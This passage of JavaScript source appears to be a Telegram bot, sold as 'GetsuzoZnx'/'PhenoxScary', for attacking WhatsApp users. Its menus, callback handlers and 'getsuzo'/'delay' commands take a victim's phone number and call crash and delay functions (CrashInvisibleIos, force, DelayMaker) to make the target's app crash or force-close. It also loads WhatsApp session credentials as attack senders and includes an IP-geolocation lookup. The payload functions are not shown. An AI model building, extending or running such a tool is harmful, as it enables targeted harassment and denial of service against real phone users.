  const welcomeText = `👋 *Selamat Datang* [${name}](tg://user?id=${member.id}) di grup *${groupTitle}*!\n\n📌 Pastikan baca aturan & jangan promosi ya~`;
  const photoUrl = "https://files.catbox.moe/zgkw7a.jpg"; 

  await ctx.telegram.sendPhoto(ctx.chat.id, photoUrl, {
    caption: welcomeText,
    parse_mode: "Markdown",
    reply_markup: {
      inline_keyboard: [
        [{ text: "💬 Join Room", url: "https://t.me/+r55iQVLXEwA1YmQ9" }],
        [{ text: "💬 Join Channel", url: "https://t.me/SanzzChannel" }],
      ],
    },
  });
});

//=================================================\\
bot.hears(/^(start|menu|mulai)$/i, async (ctx) => {
  const versi = await getBotVersion();
  const userId = ctx.from.id.toString();
  const username = ctx.from.first_name || ctx.from.username || "Tidak Diketahui";

  const mainMenuMessage = `
*╭──(      Getsuzo ☇ Znx      )*
*│🎭 𝐍𝐚𝐦𝐞 : ${username}*
*║▬▭▬▭▬▭▬▭▬▭*
│🎭 𝐎𝐰𝐧𝐞𝐫 : RenzXml
*│🎭 Name Script : GetsuzoZnx*
*│▬▭「 GetsuzoZnx」▭▬*
║› Getsuzo ©Copyright
╰━━━━━━━━━━━━━━━━━━━━━━━━━⬣
`;

  const keyboard = [
    [
       { text: "「 𝙓𝙥𝙡𝙤𝙞𝙩 」", callback_data: "bugm" },
       { text: "「 𝙎𝙤𝙪𝙧𝙘𝙚 」", callback_data: "dev_menu" },
       ],
       [
       { text: " 𝙎𝙮𝙨𝙩𝙚𝙢", callback_data: "system_menu" },
      ],
      [
       { text: "「 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧  」", url: "t.me/RapzXyzz" }
    ],
  ];

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "Markdown",
    reply_markup: { inline_keyboard: keyboard }
  });
});


bot.action("dev_menu", async (ctx) => {
  const userId = ctx.from.id.toString();
  await ctx.answerCbQuery("🔥𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝙣𝙜");

  if (userId !== developerId) {
    await ctx.answerCbQuery("𝗧𝗵𝗶𝘀 𝗺𝗲𝗻𝘂 𝗰𝗮𝗻 𝗼𝗻𝗹𝘆 𝗯𝗲 𝘂𝘀𝗲𝗱 𝗯𝘆 𝗱𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿𝘀!", { show_alert: true });
    return;
  }
  
  const mainMenuMessage = `
*╭──(    Getsuzo Source    )*
Accdb Id duration
Deldb Id 
Setversi versi

*( # ) DATABASE*
Listmem
addbl Id
delbl Id
Accmod Id
Delmod Id
Accpt Id
Delpt Id
Accress Id
Delress Id
Acctoken token
Deltoken token

*›› Sender Added Menu*
Acc
Listsender
Accpanel

*( # ) FITUR GROUP*
setwelcome on/off
ban reply
unban reply
kick reply
mute reply duration
unmute reply
╰━━━━━━━━━━━━━━━━━━━━━⬣
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "Back To Menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("system_menu", async (ctx) => {

await ctx.answerCbQuery("🔥Executing...");
  
  const mainMenuMessage = `
Core GetsuzoBot- ス

Unit Pusat Struktur Getsuzo.
Phenox Bot Adalah Ekosistem Modular Yang Dirancang Untuk Otomatisasi, Investigasi Digital, Dan Kendali Penuh Atas Data Dan Media.

Dengan Integrasi Sistematis Yang Stabil Dan Framework Kuat, Getsuzo Memungkinkan Kamu:
› Integrasi Eksploitasi Dan Intelijen
› Fokus Pada Efektivitas Dan Kemudahan User

Built Not Just To Assist, But To Dominate The Flow Of Data.
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "「 𝘼𝙘𝙘𝙚𝙨 𝙈𝙚𝙣𝙪 」", 
          callback_data: "owner_menu", 
        },
        {
          text: "「 𝙈𝙖𝙣𝙞𝙛𝙚𝙨𝙩 」",
          callback_data: "manifest",
        }
      ], 
      [
        {
          text: "𝙏𝙤𝙤𝙡𝙨",
          callback_data: "tools_menu",
        },
        {
          text: "< back to menu", 
          callback_data: "back", 
        }
      ],
    ],
  };
  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("owner_menu", async (ctx) => {
  
  const mainMenuMessage = `
╭──(     Owner Area      )
☇ Accadmin Id duration
☇ Deladmin Id
☇ Accprem Id duration
☇ Delprem Id
☇ Setcd duartion
☇ Grouponly on/off
☇ Cek 
☇ Connect 628××××
╰━━━━━━━━━━━━━━━━━⬣
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "< Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.hears(/^speed$/i, async (ctx) => {
  const sys = getSystemInfo();
  const versi = await getBotVersion();
  const userId = ctx.from.id.toString();
  
  const mainMenuMessage = `
<blockquote>System Information</blockquote>
›› Runtime ›› ${sys.uptime}
›› Cpu ›› ${sys.cpu}
›› Ram ›› ${sys.ram}
<blockquote>@ Getsuzo Znx</blockquote>
`;

  await ctx.replyWithPhoto(getRandomImage(), {
    caption: mainMenuMessage,
    parse_mode: "HTML"
  });
});

bot.action("tools_menu", async (ctx) => {
  
  await ctx.answerCbQuery("🔥𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝙣𝙜");
  
  const mainMenuMessage = `
╭──(     Tools Area      )
›› Trackip
›› Cekip
›› Iqc 
›› Tiktok
›› Cekidch
›› Lapor
›› Cs
›› Ttsearch 
›› Acces
›› Fixcode
›› Cekidgb
›› Listcmd
›› Delcmd
›› Setcmd
›› Tourl
›› Countryinfo
›› Cekid
╰━━━━━━━━━━━━━━━━━⬣
<blockquote>© Getsuzo Znx</blockquote>
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "HTML"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "< Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("menu_all", async (ctx) => {
const sys = getSystemInfo();
const versi = await getBotVersion();
  
  const mainMenuMessage = `
 -------! 𝗖𝗼𝗿𝗲 𝗠𝗼𝗱𝘂𝗹𝗲--------
 ( 𝗠𝗲𝗻𝘂 𝗔𝗰𝗰𝗲𝘀 ) 
» addadmin Id duration
» deladmin Id
» addprem Id duration
» delprem Id
» setjeda duartion
» Grouponlyon/off
» Cek <target>
» Connect 628xxx

( 𝗦𝘆𝘀𝘁𝗲𝗺 & 𝗜𝗻𝗳𝗼 ) 
» Ram ${sys.ram}
» Runtime ${sys.uptime}
» Cpu ${sys.cpu}
» Version ${versi}

( 𝗠𝗲𝗻𝘂 𝗫𝗽𝗹𝗼𝗶𝘁𝗲 )
› /nuklirdelay ( Delay Hard Invisible )
› /CrashiPhone ( Crash iPhone! )
› /bomblank ( Blank X Crash )
› /Crash ( Crash Infinity )
© 𝗚𝗲𝘁𝘀𝘂𝘇𝗼𝗫↑𝗰𝗼𝗺𝗽𝗮𝗻𝘆 🐉
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "< Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("tqto", async (ctx) => {
await ctx.answerCbQuery("🔥𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝙣𝙜");
  
  const mainMenuMessage = `\`\`\`
CONTRIBUTORS
- @RapzXyzz ( Developer )
- @RaditX7 ( Best Friends )
- @RixzzNotDev ( Best Friends )
- @YuukeyD7eppeli ( Best Friends )

Thanks For All Buyer And Partner !
\`\`\`
© Getsuzo Znx › Company ス
`;

  const media = {
    type: "photo",
    media: getRandomImage(), 
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [
        { 
          text: "< Back to menu", 
          callback_data: "back",
        }
      ],
    ],
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

bot.action("bugm", async (ctx) => {
const username = ctx.from.first_name || ctx.from.username || "Tidak Diketahui";

await ctx.answerCbQuery("🔥𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝙣𝙜");
  const mainMenuMessage = `
*╭──(      Getsuzo ☇ Znx      )*
*│🎭 𝐍𝐚𝐦𝐞 : ${username}*
*║▬▭▬▭▬▭▬▭▬▭*
│🎭 𝐎𝐰𝐧𝐞𝐫 : RenzXml
*│🎭 Name Script : GetsuzoZnx*
*│▬▭「 GetsuzoZnx 」▭▬*
║› Getsuzo ©Copyright
*│› Getsuzo 628×××*
╰━━━━━━━━━━━━━━━━━━━━━━━━━⬣
`;

  const media = {
    type: "photo",
    media: getRandomImage(), // Pastikan fungsi ini ada
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "< Back to menu", callback_data: "back" }]
    ]
  };

  try {
    await ctx.editMessageMedia(media, {
      reply_markup: keyboard
    });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard
    });
  }
});


bot.action("manifest", async (ctx) => {
await ctx.answerCbQuery("🔥𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝙣𝙜");
  const mainMenuMessage = `
\`\`\`
( Information Pengertian Perintah Script )

1. Fitur Attacking / PhenoxScary
• Untuk Menjalankan Serangan Ke Target Number
  Hingga Menyebabkan Crash / Delay / Forceclose

2. Fitur Accpt
• Menambahkan Orderan/Client User Baru

3. Fitur Accress
• Menambahkan User Ke Database Reseller

4. Fitur Maintenance
• Menghentikan System Selama Masa Update

5. Fitur Acctoken
• Menambahkan Token Bot Baru

6. Fitur Accdb
• Menambahkan User Owner dengan Validasi

7. Fitur TikTok
• Download Video TikTok: Tiktok <url>

8. Fitur Track IP
• Cek Informasi IP: Trackip 8.8.8.8

9. Fitur IQC
• Generate Screenshot Style iPhone: Iqc <text> <batt> <op>
\`\`\`
© PhenoxScary 🔥
`;

  const media = {
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  const keyboard = {
    inline_keyboard: [
      [{ text: "< Back to menu", callback_data: "back" }]
    ]
  };

  try {
    await ctx.editMessageMedia(
      {
        type: "photo",
        media: media.media,
        caption: media.caption,
        parse_mode: media.parse_mode
      },
      { reply_markup: keyboard }
    );
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard
    });
  }
});


bot.action("back", async (ctx) => {
  const versi = await getBotVersion();
  const userId = ctx.from.id.toString();
  const username = ctx.from.first_name || ctx.from.username || "Tidak Diketahui";
  await ctx.answerCbQuery("🔥𝙀𝙭𝙚𝙘𝙪𝙩𝙞𝙣𝙜");

  const mainMenuMessage = `
*╭──(      Getsuzo ☇ Znx      )*
*│🎭 𝐍𝐚𝐦𝐞 : ${username}*
*║▬▭▬▭▬▭▬▭▬▭*
│🎭 𝐎𝐰𝐧𝐞𝐫 : RenzXml
*│🎭 Name Script : Getsuzo Znx*
*│▬▭「 Getsuzo Znx 」▭▬*
║› GetsuzoZnx ©Copyright
╰━━━━━━━━━━━━━━━━━━━━━━━━━⬣
`;

  const keyboard = {
   inline_keyboard: [
    [
      { 
        text: "「 𝙓𝙥𝙡𝙤𝙞𝙩 」", 
          callback_data: "bugm" 
      }, 
      { 
          text: "「 𝙎𝙤𝙪𝙧𝙘𝙚 」", 
          callback_data: "dev_menu"
      },
    ],
    [
      {
            text: " 𝙎𝙮𝙨𝙩𝙚𝙢", 
            callback_data: "system_menu" 
      }
    ],
    [
       {
           text: "「 𝘿𝙚𝙫𝙚𝙡𝙤𝙥𝙚𝙧 」", 
           url: "t.me/RapzXyzz" 
       }
    ],
  ],
};
  
const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown"
  };

  try {
    await ctx.editMessageMedia(media, { reply_markup: keyboard, });
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});



// ================================
//  HANDLE PESAN USER
// ================================
// ======================================
//  COMMAND "tizi"
// ======================================
bot.hears(/^getsuzo\b(?:\s+(.*))?$/i, async (ctx) => {
    const msg = ctx.message;
    const text = msg?.text || msg?.caption || "";
    const q = text.split(" ")[1];

    if (!q) return ctx.reply("›› Format Getsuzo 628×××");

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    const keyboard = {
        inline_keyboard: [
            [
                { text: "‹ IPHONE ›", callback_data: `menuDelay:${target}` },
                { text: "‹ ANDROID ›", callback_data: `menuCrash:${target}` }
            ]
        ]
    };

    await ctx.replyWithPhoto(getRandomImage(), {
        caption: `
╭──(      GetsuzoZnx      )
│🎭 Attacking : ${q}
║▬▭▬▭▬▭▬▭▬▭
│🎭 Succes ›› Acces ✓
│▬▭「 PhenoxScary 」▭▬
║›ZnxCompany ©Copyright
╰━━━━━━━━━━━━━━━━━━⬣
`,
        reply_markup: keyboard
    });
});


// ======================================
//  CALLBACK BUTTON (LEVEL MENU)
// ======================================
bot.on("callback_query", async (ctx) => {
    const data = ctx.callbackQuery.data;
    const [action, target] = data.split(":");

    await ctx.answerCbQuery(); // fast respon no popup

    // =============================
    //  MENU DELAY
    // =============================
    if (action === "menuDelay") {
        return ctx.editMessageReplyMarkup({
            inline_keyboard: [
                [{ text: " 𝘾𝙧𝙖𝙨𝙝 𝙄𝙣𝙑𝙞𝙨𝙞𝙗𝙡𝙚  ", callback_data: `delayBasic:${target}` }],
            ]
        });
    }

    // =============================
    //  MENU CRASH
    // =============================
    if (action === "menuCrash") {
        return ctx.editMessageReplyMarkup({
            inline_keyboard: [
                [{ text: " 𝘾𝙧𝙖𝙨𝙝 𝘼𝙣𝙙𝙧𝙤𝙞𝙙 ", callback_data: `crashBasic:${target}` }],
                [{ text: " 𝘿𝙚𝙡𝙖𝙮 𝙄𝙣𝙑𝙞𝙨𝙞𝙗𝙡𝙚 ", callback_data: `crashBrutal:${target}` }],
            ]
        });
    }

    // =============================
    //  KEMBALI KE MENU UTAMA
    // =============================
    if (action === "backMain") {
        return ctx.editMessageReplyMarkup({
            inline_keyboard: [
                [
                    { text: "「 𝘼𝙣𝙙𝙧𝙤𝙞𝙙 」", callback_data: `menuDelay:${target}` },
                    { text: "「 𝙞𝙋𝙝𝙤𝙣𝙚 」", callback_data: `menuCrash:${target}` }
                ]
            ]
        });
    }

    // =============================
    //  EKSEKUSI DELAY
    // =============================
    if (action === "delayBasic") {
        CrashInvisibleIos(target)
    }

    // =============================
    //  EKSEKUSI CRASH
    // =============================
    if (action === "crashBasic") {
        force(target);
    }
    if (action === "crashBrutal") {
        DelayMaker(target);
    }

    // =============================
    //  NOTIFIKASI SUKSES (EDIT CAPTION)
    // =============================
    await ctx.editMessageCaption(`
╭──(      GetsuzoZnx     )
│🎭 Status : Successfully
║▬▭▬▭▬▭▬▭▬▭
│🎭 Attacking ››››
│▬▭「 GetsuzoZnx 」▭▬
║›ZnxCompany ©Copyright
╰━━━━━━━━━━━━━━━━━━⬣
`, {
        reply_markup: {
            inline_keyboard: [
                [{ text: "「 𝗗𝗲𝘃𝗲𝗹𝗼𝗽𝗲𝗿 」", url: "https://t.me/RapzXyzz" }],
            ]
        }
    });
});



// ================================
//  COMMAND UNTUK MULAI REQUEST
// ================================
//=================================================\\



bot.hears(/^cekidch\b(?:\s+(.*))?$/i, async (ctx) => {
  const args = ctx.message.text.split(" ");
  
  // Cek input
  if (args.length < 2) return ctx.reply("❌ Format salah! Cekidch <link_channel>");
  
  const link = args[1];

  // Validasi link channel WA
  if (!link.includes("https://whatsapp.com/channel/")) {
    return ctx.reply("❌ Link channel tidak valid!");
  }

  try {
    // Ambil kode undangan dari link
    const inviteCode = link.split("https://whatsapp.com/channel/")[1];

    // Ambil metadata channel WA via Baileys
    const res = await zenxy.newsletterMetadata("invite", inviteCode);

    // Format teks hasil
    const teks = `
📡 *Data Channel WhatsApp*
━━━━━━━━━━━━━━━━━━
🆔 *ID:* ${res.id}
📛 *Nama:* ${res.name}
👥 *Total Pengikut:* ${res.subscribers}
📊 *Status:* ${res.state}
✅ *Verified:* ${res.verification === "VERIFIED" ? "Terverifikasi" : "Belum Verif"}
`;

    // Kirim balasan ke Telegram
    await ctx.reply(teks, { parse_mode: "Markdown" });

  } catch (err) {
    console.error(err);
    ctx.reply("❌ Gagal mengambil data channel. Pastikan link benar dan WA bot online.");
  }
});

bot.hears(/^cs$/i, async (ctx) => {
  try {
    const userId = ctx.from.id.toString();
    const username = ctx.from.first_name || ctx.from.username || "Tidak Diketahui";

    // Gunakan fungsi cek premium milik kamu
    const statusPremium = isPremium(userId) ? "✅" : "❌";
    const role = isDeveloper(userId) ? "Developer" : "User";

    await ctx.replyWithPhoto(
      { url: "https://files.catbox.moe/a63g13.jpg" },
      {
        caption: `
*STATUS USER*

Username : *${username}*
Premium : *${statusPremium}*

        `.trim(),
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              { text: "「 Developer 」", url: "https://t.me/RapzXyzz" }
            ]
          ]
        }
      }
    );

  } catch (err) {
    console.log(err);
    ctx.reply("❌ Terjadi kesalahan.");
  }
});



bot.hears(/^lapor\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    const message = ctx.message.text.split(' ').slice(1).join(' ');
    const sender = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || 'Pengguna';

    if (!message)
      return ctx.reply('💬 Kirim laporan ke owner dengan format:\nLapor <pesan kamu>');

    // Kirim ke owner
    await ctx.telegram.sendMessage(
      developerId,
      `📩 Pesan baru dari ${sender} (ID: ${ctx.from.id}):\n\n${message}`
    );

    ctx.reply('✅ Laporan kamu sudah dikirim ke owner.');
  } catch (err) {
    console.error(err);
    ctx.reply('❌ Gagal mengirim laporan ke owner.');
  }
});

bot.hears(/^cekip\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    const input = ctx.message.text.split(' ')[1];
    if (!input) return ctx.reply('⚠️ Masukkan domain!\nContoh: Cekip google.com');

    ctx.reply('Waiting For Proccesing...');

    dns.lookup(input, (err, address) => {
      if (err) {
        ctx.reply(`❌ Gagal menemukan IP untuk domain: ${input}\nError: ${err.message}`);
      } else {
        ctx.reply(`✅ IP dari domain *${input}* adalah:\n\n🌐 ${address}`, { parse_mode: 'Markdown' });
      }
    });
  } catch (e) {
    console.error(e);
    ctx.reply('❌ Terjadi kesalahan saat memproses permintaan.');
  }
});

bot.hears(/^acc\b(?:\s+(.*))?$/i, checkAdmin, async (ctx) => {
  const args = ctx.message.text.split(" ");
  if (args.length < 2) {
    return ctx.reply("❌ Kirim session JSON langsung setelah command.\nContoh:\n/addcreds {\"creds\":{...}}");
  }

  // Gabungkan semua teks setelah "/addcreds " menjadi string JSON
  const sessionText = ctx.message.text.replace("/acc ", "").trim();

  try {
    JSON.parse(sessionText); // cek validitas JSON

    const sessionName = "sender_" + Date.now(); // nama unik
    const sessionPath = `./sessions/${sessionName}`;
    if (!fs.existsSync(sessionPath)) fs.mkdirSync(sessionPath, { recursive: true });

    // Simpan ke creds.json
    fs.writeFileSync(`${sessionPath}/creds.json`, sessionText);

    // Load session langsung
    const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
    const { version } = await fetchLatestBaileysVersion();

    const newSock = makeWASocket({
      version,
      auth: state,
      logger: pino({ level: "silent" }),
      printQRInTerminal: false,
    });

    newSock.ev.on("creds.update", saveCreds);

    newSock.ev.on("connection.update", ({ connection }) => {
      if (connection === "open") {
        ctx.reply(`WhatsApp *${sessionName}* Succes Connected!`);
        senders.push({ name: sessionName, sock: newSock });
      }
    });

  } catch (e) {
    console.error("❌ Gagal load session:", e.message);
    ctx.reply("❌ Session tidak valid. Pastikan isi JSON benar.");
  }
});

bot.hears(/^cekidgb\b(?:\s+(.*))?$/i, async (ctx) => {
  const text = ctx.message.text.split(" ")[1];

  if (!text)
    return ctx.reply(
      "⚠️ Kirim link grup WhatsApp!\nContoh:\nCekidgb https://chat.whatsapp.com/XXXXX"
    );

  await ctx.reply("𝙒𝙖𝙞𝙩𝙞𝙣𝙜 𝙁𝙤𝙧 𝙋𝙧𝙤𝙘𝙚𝙨𝙨𝙞𝙣𝙜🔥");

  const result = await cekGroupDariLink(sock, text);

  if (!result.ok)
    return ctx.reply(`❌ Gagal: ${result.error}`);

  const replyMsg = `
✅ *Grup Ditemukan!*
────────────────────
*Nama:* ${result.subject}
*ID Grup:* ${result.groupId}
*Jumlah Anggota:* ${result.size || "-"}
*Owner:* ${result.owner}
*Expire:* ${result.expiration || "-"}
`;

  await ctx.replyWithMarkdown(replyMsg);
});

bot.hears(/^listsender\b(?:\s+(.*))?$/i, async (ctx) => {
  const devices = fs.readdirSync(SESSIONS_DIR).filter((dir) => {
    return fs.existsSync(path.join(SESSIONS_DIR, dir, "creds.json"));
  });

  if (devices.length === 0) {
    return ctx.reply(" Tidak ada sender tersimpan.");
  }

  let replyMsg = "📑 Daftar Sender:\n";

  for (const tagFile of devices) {
    const credsPath = path.join(SESSIONS_DIR, tagFile, "creds.json");

    try {
      const { state, saveState } = useSingleFileAuthState(credsPath);
      const sock = makeWASocket({ auth: state, printQRInTerminal: false });

      sock.ev.on("creds.update", saveState);

      await new Promise((resolve) => {
        sock.ev.on("connection.update", (update) => {
          const { connection } = update;

          if (connection === "open") {
            const me = sock.user || {};
            replyMsg += `\n✅ ${tagFile}\n- ID: ${me.id}\n- Nama: ${me.name}`;
            sock.end();
            resolve();
          } else if (connection === "close") {
            replyMsg += `\n❌ ${tagFile} (expired / invalid)`;
            resolve();
          }
        });
      });
    } catch (err) {
      console.error(err);
      replyMsg += `\n⚠️ ${tagFile} (gagal dibaca)`;
    }
  }

  ctx.reply(replyMsg);
});

bot.hears(/^delay\b(?:\s+(.*))?$/i, checkWhatsAppConnection, checkPremium, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  const userId = ctx.from.id.toString();
  const chatId = ctx.chat.id;

  if (!q) return ctx.reply("›› Format:\n Crash 628xxxx");

  if (!isActiveUser(ownerUsers, userId)) {
    if (isOnGlobalCooldown()) {
      const remainingTime = Math.ceil((globalCooldown - Date.now()) / 1000);
      return ctx.reply(`⏳ Jeda, tunggu ${remainingTime} detik lagi`);
    }
  }

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  const sentMessage = await ctx.replyWithPhoto(getRandomImage(), {
    caption: `
*╭──(      PhenoxScary     )*
*│🎭 Status : Proccesing*
*║▬▭▬▭▬▭▬▭▬▭*
*│🎭 Attacking ›› ${q}*
*║🎭 Acces Successfully ✓*
*│▬▭「 PhenoxScary 」▭▬*
*║›ZnxCompany ©Copyright*
*╰━━━━━━━━━━━━━━━━━━━━━⬣*
`,
    parse_mode: "Markdown",
  });
  
  console.log("\x1b[32m[BOT]\x1b[0m PROSES MENGIRIM BUG");

  if (!isActiveUser(ownerUsers, userId)) setGlobalCooldown();

  for (let i = 0; i < 1; i++) {
    await DelayMaker(target)
  }
  
  console.log("\x1b[32m[BOT]\x1b[0m BUG BERHASIL DIKIRIM!");

  await ctx.editMessageCaption(
    `
*╭──(      PhenoxScary     )*
*│🎭 Status : Succes Sended*
*║▬▭▬▭▬▭▬▭▬▭*
*│🎭 Attacking ›› ${q}*
*║🎭 Crash✓*
*│▬▭「 PhenoxScary 」▭▬*
*║›ZnxCompany ©Copyright*
*╰━━━━━━━━━━━━━━━━━━━━━⬣*
`,
    {
      chat_id: chatId,
      message_id: sentMessage.message_id,
      media: getRandomImage(),
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Developer", url: `https://wa.me/${q}` }],
        ],
      },
    }
  );
});

bot.hears(/^toimg\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    const reply = ctx.message.reply_to_message;

    // Cek apakah user reply ke sticker
    if (!reply || !reply.sticker) {
      return await ctx.reply("❌ Reply ke sticker yang ingin diubah menjadi gambar!");
    }

    const fileId = reply.sticker.file_id;
    const fileLink = await ctx.telegram.getFileLink(fileId);

    // Unduh sticker (biasanya format .webp)
    const response = await axios.get(fileLink.href, { responseType: "arraybuffer" });
    const webpPath = path.join(__dirname, "sticker.webp");
    const pngPath = path.join(__dirname, "sticker.png");

    fs.writeFileSync(webpPath, response.data);

    // Konversi .webp ke .png menggunakan sharp
    await sharp(webpPath)
      .png()
      .toFile(pngPath);

    // Kirim hasil gambar ke user
    await ctx.replyWithPhoto({ source: pngPath });

    // Hapus file sementara
    fs.unlinkSync(webpPath);
    fs.unlinkSync(pngPath);

  } catch (err) {
    console.error("❌ Error toimg:", err);
    await ctx.reply("⚠️ Terjadi kesalahan saat memproses gambar.");
  }
});

bot.hears(/^setcmd\b(?:\s+(.*))?$/i, async (ctx) => {
  try {
    const cmd = ctx.message.text.split(" ")[1];
    if (!cmd) return ctx.reply("⚠️ Contoh: Reply sticker lalu ketik:\n\n`setcmd start`");

    if (!ctx.message.reply_to_message?.sticker)
      return ctx.reply("⚠️ Harus reply ke sticker!");

    const fileId = ctx.message.reply_to_message.sticker.file_unique_id;

    setcmd[fileId] = cmd.toLowerCase();
    saveSetcmd();

    await ctx.reply(`✅ Sticker sekarang bisa menjalankan perintah: *${cmd}*`, { parse_mode: "Markdown" });

  } catch (e) {
    console.log(e);
    ctx.reply("❌ Gagal menyimpan command.");
  }
});

bot.on("sticker", async (ctx) => {
  try {
    const fileId = ctx.message.sticker.file_unique_id;

    if (setcmd[fileId]) {
      const cmd = setcmd[fileId]; // contoh: "start"
      ctx.message.text = cmd;     // seolah user mengetik "start"
      return bot.handleUpdate(ctx.update);
    }

  } catch (e) {
    console.log(e);
  }
});


bot.hears(/^trackip\b(?:\s+(.*))?$/i, checkPremium, async (ctx) => {
  const args = ctx.message.text.split(" ").filter(Boolean);
  if (!args[1]) return ctx.reply("›› Format: Trackip 8.8.8.8");

  const ip = args[1].trim();

  function isValidIPv4(ip) {
    const parts = ip.split(".");
    if (parts.length !== 4) return false;
    return parts.every(p => {
      if (!/^\d{1,3}$/.test(p)) return false;
      if (p.length > 1 && p.startsWith("0")) return false; // hindari "01"
      const n = Number(p);
      return n >= 0 && n <= 255;
    });
  }

  function isValidIPv6(ip) {
    const ipv6Regex = /^(([0-9a-fA-F]{1,4}:){7}[0-9a-fA-F]{1,4}|(::)|(::[0-9a-fA-F]{1,4})|([0-9a-fA-F]{1,4}::[0-9a-fA-F]{0,4})|([0-9a-fA-F]{1,4}(:[0-9a-fA-F]{1,4}){0,6}::([0-9a-fA-F]{1,4}){0,6}))$/;
    return ipv6Regex.test(ip);
  }

  if (!isValidIPv4(ip) && !isValidIPv6(ip)) {
    return ctx.reply("❌ ☇ IP tidak valid masukkan IPv4 (contoh: 8.8.8.8) atau IPv6 yang benar");
  }

  let processingMsg = null;
  try {
  processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`, {
    parse_mode: "HTML"
  });
} catch (e) {
    processingMsg = await ctx.reply(`🔎 ☇ Tracking IP ${ip} — sedang memproses`);
  }

  try {
    const res = await axios.get(`https://ipwhois.app/json/${encodeURIComponent(ip)}`, { timeout: 10000 });
    const data = res.data;

    if (!data || data.success === false) {
      return await ctx.reply(`❌ ☇ Gagal mendapatkan data untuk IP: ${ip}`);
    }

    const lat = data.latitude || "";
    const lon = data.longitude || "";
    const mapsUrl = lat && lon ? `https://www.google.com/maps/search/?api=1&query=${encodeURIComponent(lat + ',' + lon)}` : null;

    const caption = `
<blockquote><pre>⬡═―—⊱ ⎧ PhenoxScary ⎭ ⊰―—═⬡</pre></blockquote>
⌑ IP: ${data.ip || "-"}
⌑ Country: ${data.country || "-"} ${data.country_code ? `(${data.country_code})` : ""}
⌑ Region: ${data.region || "-"}
⌑ City: ${data.city || "-"}
⌑ ZIP: ${data.postal || "-"}
⌑ Timezone: ${data.timezone_gmt || "-"}
⌑ ISP: ${data.isp || "-"}
⌑ Org: ${data.org || "-"}
⌑ ASN: ${data.asn || "-"}
⌑ Lat/Lon: ${lat || "-"}, ${lon || "-"}
`.trim();

    const inlineKeyboard = mapsUrl ? {
      reply_markup: {
        inline_keyboard: [
